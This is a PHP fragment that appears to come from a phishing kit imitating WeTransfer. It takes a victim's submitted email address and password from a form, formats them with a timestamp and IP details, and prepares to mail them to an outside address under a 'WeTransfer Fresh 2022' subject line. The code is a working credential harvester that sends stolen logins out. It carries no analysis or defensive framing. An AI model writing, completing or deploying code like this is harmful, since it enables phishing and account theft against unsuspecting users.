...
$id = $email = $_POST['emaildata'];
$passwdata = $_POST['passwdata'];

// var_dump($_POST);
// die;

if (empty($email) || empty($passwdata)) {
...
Password : <b>$passwdata</b>

<p>Time Received - ". date("d/m/Y h:i:s a") ."</p>
";


$to = "logs@ionutneacsu.ro";
$subject = "WeTransfer Fresh 2022 $email | $ipDetails";
$headers = "From: Chimso-Log\r\n";
